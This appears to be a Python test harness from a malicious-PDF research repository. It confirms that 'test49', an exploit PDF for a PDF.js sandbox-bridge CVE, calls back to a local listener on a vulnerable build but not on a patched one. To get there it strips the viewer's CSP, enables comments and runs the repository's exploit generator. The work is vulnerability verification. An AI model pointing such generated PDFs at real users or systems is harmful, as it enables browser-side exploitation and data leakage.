#!/usr/bin/env python3
"""Verify test49 (CVE-2026-16633) against real PDF.js builds.

test49 probes the PDF.js scripting-sandbox bridge. Unlike the Acrobat-targeted
test cases, it can be checked automatically: the flaw was fixed in a known
release, so a vulnerable build and a patched build give opposite results.

The script downloads two pdfjs dist releases, serves each one over HTTP,
generates test49.pdf pointed at a local listener, drives headless Chrome, and
reports which configurations produced a callback.

Expected outcome:

    pdfjs-dist 6.1.200, no CSP      callback      (vulnerable)
    pdfjs-dist 6.2.108, no CSP      no callback   (fixed)
    pdfjs-dist 6.1.200, stock CSP   no callback   (img-src blocks the fetch,
                                                   though the DOM is still forged)

Exit status is 0 when all three match, 1 otherwise.

Requirements:
  * node, plus puppeteer-core:   npm install puppeteer-core
  * Google Chrome (override the path with --chrome)
  * network access for the two release downloads

The downloads and the patched viewers are written to a working directory
outside the repository; pass --keep to inspect them afterwards.

Note on the viewer patches: the stock dist build ships a strict CSP and
defaults enableComment to false, so neither the callback nor the comment UI is
reachable out of the box. The script therefore produces a second viewer with
the CSP removed and turns the comment feature on, which models an integrator
who embeds PDF.js without a restrictive policy. That is the population the
advisory describes.
"""

import argparse
import http.server
import json
import os
import re
import shutil
import socketserver
import subprocess
import sys
import tempfile
import threading
import urllib.request
import zipfile
from functools import partial
from pathlib import Path

VULN_VERSION = "6.1.200"
PATCHED_VERSION = "6.2.108"
RELEASE_URL = ("https://github.com/mozilla/pdf.js/releases/download/"
               "v{v}/pdfjs-{v}-dist.zip")
DEFAULT_CHROME = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

CALLBACK_PORT = 8099
VULN_PORT = 8101
PATCHED_PORT = 8102

REPO_ROOT = Path(__file__).resolve().parent.parent

DRIVER_JS = r"""
import puppeteer from "puppeteer-core";
const [chrome, base, viewer] = process.argv.slice(2);
const CB = "127.0.0.1:%(cb)d";
const browser = await puppeteer.launch({
  executablePath: chrome,
  headless: "shell",
  args: ["--no-sandbox", "--disable-gpu"],
});
const page = await browser.newPage();
const hits = [];
page.on("request", r => { if (r.url().includes(CB)) hits.push(r.url()); });
await page.goto(`${base}/web/${viewer}?file=test49.pdf`, {
  waitUntil: "networkidle2", timeout: 30000,
});
await new Promise(r => setTimeout(r, 5000));
const state = await page.evaluate(async () => {
  const btns = [...document.querySelectorAll("button")]
    .filter(b => /annotationCommentButton/.test(b.className));
  btns[0]?.click();
  await new Promise(r => setTimeout(r, 1500));
  return {
    commentButtons: btns.length,
    richText: document.querySelectorAll(".richText").length,
    forgedNodes: [...document.querySelectorAll("img")]
      .map(i => i.getAttribute("src"))
      .filter(s => s && s.includes("8099")).length,
  };
});
await new Promise(r => setTimeout(r, 1000));
console.log(JSON.stringify({ requested: hits, ...state }));
await browser.close();
""" % {"cb": CALLBACK_PORT}


class CallbackHandler(http.server.BaseHTTPRequestHandler):
    """Records every request path; stands in for Burp Collaborator."""

    hits = []

    def do_GET(self):  # noqa: N802 - http.server API
        CallbackHandler.hits.append(self.path)
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(bytes.fromhex(
            "47494638396101000100800000000000ffffff21f90401000000"
            "002c00000000010001000002024401003b"))

    do_POST = do_GET

    def log_message(self, *args):
        pass


class QuietHTTP(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


class StaticHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass


def serve(directory, port):
    handler = partial(StaticHandler, directory=str(directory))
    httpd = QuietHTTP(("127.0.0.1", port), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd


def fetch_build(version, dest):
    """Download and unpack one pdfjs dist release into dest."""
    dest.mkdir(parents=True, exist_ok=True)
    zip_path = dest / "dist.zip"
    url = RELEASE_URL.format(v=version)
    print(f"  downloading pdfjs {version}")
    urllib.request.urlretrieve(url, zip_path)  # noqa: S310 - fixed GitHub URL
    with zipfile.ZipFile(zip_path) as zf:
        zf.extractall(dest)
    zip_path.unlink()
    if not (dest / "web" / "viewer.html").is_file():
        sys.exit(f"unexpected archive layout for {version}: no web/viewer.html")


def enable_comments(viewer_mjs):
    """Flip the enableComment default to true.

    The option is false in release builds (`typeof PDFJSDev === "undefined"`),
    so the comment UI that renders the forged rich text never appears. Firefox
    ships with it on. The compiled shape differs between versions, so locate
    the key and rewrite the `value:` that follows it.
    """
    text = viewer_mjs.read_text()
    idx = text.find("enableComment")
    if idx == -1:
        sys.exit(f"enableComment not found in {viewer_mjs}")
    # Match the first value: that follows the key, rather than scanning a fixed
    # window -- a window wide enough to be safe also reaches the next option,
    # whose value would be mistaken for this one.
    m = re.search(r"value:\s*(true|false)", text[idx:idx + 200])
    if not m:
        sys.exit(f"no value: found after enableComment in {viewer_mjs}")
    if m.group(1) == "true":
        return  # already flipped by an earlier run on a cached build
    viewer_mjs.write_text(
        text[:idx + m.start()] + "value: true" + text[idx + m.end():])


def strip_csp(viewer_html, out_html):
    """Write a copy of the viewer without its Content-Security-Policy meta."""
    text = viewer_html.read_text()
    stripped = re.sub(
        r'<meta\s+http-equiv="Content-Security-Policy".*?/>',
        "<!-- CSP removed by tools/verify_test49.py -->",
        text, flags=re.S)
    if stripped == text:
        sys.exit(f"no CSP meta found in {viewer_html}")
    out_html.write_text(stripped)


def generate_test49(target_dirs, host):
    """Run the repository's generator and copy test49.pdf into each build."""
    with tempfile.TemporaryDirectory() as out:
        subprocess.run(
            [sys.executable, str(REPO_ROOT / "malicious-pdf.py"), host,
             "--output-dir", out],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        pdf = Path(out) / "test49.pdf"
        if not pdf.is_file():
            sys.exit("generator did not produce test49.pdf")
        for d in target_dirs:
            shutil.copy(pdf, d / "web" / "test49.pdf")


def run_case(workdir, chrome, base, viewer):
    CallbackHandler.hits.clear()
    proc = subprocess.run(
        ["node", str(workdir / "driver.mjs"), chrome, base, viewer],
        capture_output=True, text=True, cwd=workdir)
    if proc.returncode != 0:
        print(proc.stderr.strip()[:600])
        sys.exit("driver failed")
    state = json.loads(proc.stdout.strip().splitlines()[-1])
    state["serverHits"] = list(CallbackHandler.hits)
    return state


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--chrome", default=DEFAULT_CHROME, help="Chrome binary")
    ap.add_argument("--workdir", help="where to unpack builds (default: a temp dir)")
    ap.add_argument("--keep", action="store_true", help="keep the working directory")
    args = ap.parse_args()

    if not shutil.which("node"):
        sys.exit("node not found; install Node.js and `npm install puppeteer-core`")
    if not Path(args.chrome).exists():
        sys.exit(f"Chrome not found at {args.chrome} (override with --chrome)")

    workdir = Path(args.workdir) if args.workdir else Path(tempfile.mkdtemp(
        prefix="verify-test49-"))
    workdir.mkdir(parents=True, exist_ok=True)
    print(f"working directory: {workdir}")

    try:
        (workdir / "driver.mjs").write_text(DRIVER_JS)
        check = subprocess.run(["node", "-e", "import('puppeteer-core')"],
                               capture_output=True, cwd=workdir)
        if check.returncode != 0:
            sys.exit(f"puppeteer-core not importable from {workdir}.\n"
                     f"Run:  cd {workdir} && npm install puppeteer-core\n"
                     f"or use --workdir in a directory that already has it.")

        builds = {}
        for name, version in (("vuln", VULN_VERSION), ("patched", PATCHED_VERSION)):
            d = workdir / name
            if not (d / "web" / "viewer.html").is_file():
                fetch_build(version, d)
            enable_comments(d / "web" / "viewer.mjs")
            strip_csp(d / "web" / "viewer.html", d / "web" / "viewer-nocsp.html")
            builds[name] = d

        generate_test49(builds.values(), f"http://127.0.0.1:{CALLBACK_PORT}")

        servers = [
            serve(builds["vuln"], VULN_PORT),
            serve(builds["patched"], PATCHED_PORT),
        ]
        cb = QuietHTTP(("127.0.0.1", CALLBACK_PORT), CallbackHandler)
        threading.Thread(target=cb.serve_forever, daemon=True).start()
        servers.append(cb)

        cases = [
            (f"pdfjs-dist {VULN_VERSION}", "no CSP",
             f"http://127.0.0.1:{VULN_PORT}", "viewer-nocsp.html", True),
            (f"pdfjs-dist {PATCHED_VERSION}", "no CSP",
             f"http://127.0.0.1:{PATCHED_PORT}", "viewer-nocsp.html", False),
            (f"pdfjs-dist {VULN_VERSION}", "stock CSP",
             f"http://127.0.0.1:{VULN_PORT}", "viewer.html", False),
        ]

        print()
        print(f"{'build':<22}{'CSP':<12}{'forged DOM':<13}{'callback':<11}result")
        print("-" * 70)
        ok = True
        for build, csp, base, viewer, expect_cb in cases:
            r = run_case(workdir, args.chrome, base, viewer)
            got = bool(r["serverHits"])
            passed = got == expect_cb
            ok &= passed
            print(f"{build:<22}{csp:<12}"
                  f"{('yes' if r['forgedNodes'] else 'no'):<13}"
                  f"{('yes' if got else 'no'):<11}"
                  f"{'OK' if passed else 'UNEXPECTED'}")

        for s in servers:
            s.shutdown()

        print()
        if ok:
            print("test49 behaves as expected against both builds.")
            return 0
        print("Differential did not match. test49 may need updating, or the\n"
              "upstream builds changed. See the module docstring for the\n"
              "expected outcome.")
        return 1
    finally:
        if args.keep or args.workdir:
            print(f"left working directory in place: {workdir}")
        else:
            shutil.rmtree(workdir, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
